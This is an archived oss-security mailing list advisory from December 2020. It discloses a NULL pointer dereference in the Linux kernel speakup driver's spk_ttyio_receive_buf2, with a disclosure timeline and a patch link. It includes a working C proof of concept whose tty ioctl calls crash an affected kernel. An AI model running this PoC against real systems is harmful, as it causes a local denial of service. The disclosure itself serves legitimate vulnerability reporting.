X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1907" "Monday" "7" "December" "2020" "10:20:44" "+0800" "Shisong Qin" "qinshisong1205@gmail.com" "<CAM1BPE5H=DB0=83v4+i4pqUCJeJre5UTv5XSSV1MoX-4Ufyb0A@mail.gmail.com>" "72" "[oss-security] Linux kernel NULL-ptr deref bug in spk_ttyio_receive_buf2" nil nil nil "12" "2020120702:20:44" "[oss-security] Linux kernel NULL-ptr deref bug in spk_ttyio_receive_buf2" (number mark "U       qinshisong12 Dec  7   72/1907  " thread-indent "\"[oss-security] Linux kernel NULL-ptr deref bug in spk_ttyio_receive_buf2\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Linux kernel NULL-ptr deref bug in spk_ttyio_receive_buf2" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 3643 invoked by uid 550); 7 Dec 2020 05:08:29 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 26279 invoked from network); 7 Dec 2020 02:21:07 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to:cc;
        bh=2G8ox7YJrnjN6pSXTkaeRF+f+NssI16PBezfvHIcbuQ=;
        b=ZRxA/c5annBCst3helD67bsWu7oeNf+X25CdY19xk2gBsVye/fTXX0lpJ1lvYN23fn
         gQHt5SgQYi0dybQut4usbE/dWsXvTlcaS6GF8JOSd1q5M70Wbwy4C0iXdxpcU2oerSLb
         3UwNpJghWhfIGyVl7xEz1EPeM9aOY8yM1QOwOKapUTxMHy/AAzL+8z353C2kozh3ZBRN
         8qLRJjMM+WNPe+mVXD3+PaarvvU0xiC0xy64Fr6M2OQT/0ZM94qK2KySMQsfve5+T+5A
         btx+S4TE2P2dsq4rQSRN46l8VFg1PJ1g+ExtSvC29MtCq4dTMPdPZA0HbDbvRx2KUOqY
         zChQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to:cc;
        bh=2G8ox7YJrnjN6pSXTkaeRF+f+NssI16PBezfvHIcbuQ=;
        b=hvfp3YlMj0oF+p+JYZcCeOpAVyPgykY77L8Jjlsve4zsZZMg3vvfmMoB+C/4PThm0a
         shxr93dpAKZoRI8xiJMLCtLhlfQpM7CJashtDLKhHBqTJK8rUQsONP1RMPZ/tWn+lq/c
         vfnQYkkOjXc6Y3f+TWtmuWMHVbNVeeS2eAyS3lfWXEK2ySjArQN/5r32GV3SwVBwNxSh
         MDJ5eYsaPNJ5iHasBl3mIbXcqRooaNs4C0jmvwR92d3nModSRlSsvbFVIAgQAb6nGQ1b
         242kQIOy9bUUlRncCrHL0E+8ucu8fD14mAV766+ACBw3TdQtt9qAO8evm1AN0qWHXq+R
         64vw==
X-Gm-Message-State: AOAM532DJxeLnRaZM9TXZNaAamnP6q/c+jn9B2lsH3axDZnMyLDPTiPY
	BziGM8ZAMER5MLzzfyqI2wiZ2+QFrr0baBw/u7XgL2BiqgQFRw==
X-Google-Smtp-Source: ABdhPJx2u83JRP62jmbPO7TroaI83/jkR89EUzfjoDI6ozPPCOgpsdolQGRVcI6LMNK48eNqZilte01nsRgQE5plwfg=
X-Received: by 2002:adf:aa4a:: with SMTP id q10mr16662103wrd.276.1607307655195;
 Sun, 06 Dec 2020 18:20:55 -0800 (PST)
MIME-Version: 1.0
From: Shisong Qin <qinshisong1205@gmail.com>
Date: Mon, 7 Dec 2020 10:20:44 +0800
Message-ID: <CAM1BPE5H=DB0=83v4+i4pqUCJeJre5UTv5XSSV1MoX-4Ufyb0A@mail.gmail.com>
To: oss-security@lists.openwall.com
Cc: nopitydays@gmail.com
Content-Type: multipart/alternative; boundary="000000000000d52d7505b5d679ef"
Subject: [oss-security] Linux kernel NULL-ptr deref bug in spk_ttyio_receive_buf2

--000000000000d52d7505b5d679ef
Content-Type: text/plain; charset="UTF-8"

Hi,

Recently we found another NULL-ptr deref BUG in spk_ttyio.c in the latest
Linux kernel(5.9.11 is the latest at that now). In the
spk_ttyio_receive_buf2() function, it would dereference spk_ttyio_synth
without checking whether it is NULL or not, and may lead to a NULL-ptr
deref crash.

This bug could be reproduced in the Linux kernel (e.g. 5.9.11) with
CONFIG_ACCESSIBILITY=y, CONFIG_SPEAKUP=y and CONFIG_KASAN=y, and here is a
simple poc:

#define _GNU_SOURCE

#include <dirent.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#pragma pack(1)
typedef struct {
        char subcode;
        short xs, ys, xe, ye;
        short sel_mode;
} sel_struct;

int main(int argc, char const *argv[]) {

    int disc = 0x1a;
    int fd = open("/dev/tty1", 0, 0);
    ioctl(fd, 0x5423, &disc);

    sel_struct sel;
    sel.subcode = 2;
    sel.xs = sel.ys = sel.xe = sel.ye = 0;
    sel.sel_mode = 0x0; // sel_mode = 0x0/0x1/0x2 could trigger this
NULL-ptr dereference bug
    ioctl(fd, 0x541c, &sel);
    char data = 3;
    ioctl(fd, 0x541c, &data);
    return 0;
}

Here is the commit to patch this BUG:
https://git.kernel.org/pub/scm/linux/kernel/git/gregkh/char-misc.git/commit/?h=char-misc-linus&id=f0992098cadb4c9c6a00703b66cafe604e178fea

Timeline:
* 2020/11/24 - Vulnerability reported to security@kernel.org
* 2020/11/29 - Vulnerability confirmed, and reported to
linux-distros@vs.openwall.org.
* 2020/12/7 - Vulnerability opened.

Thanks, Shisong Qin and Bodong Zhao, Tsinghua University

--000000000000d52d7505b5d679ef--
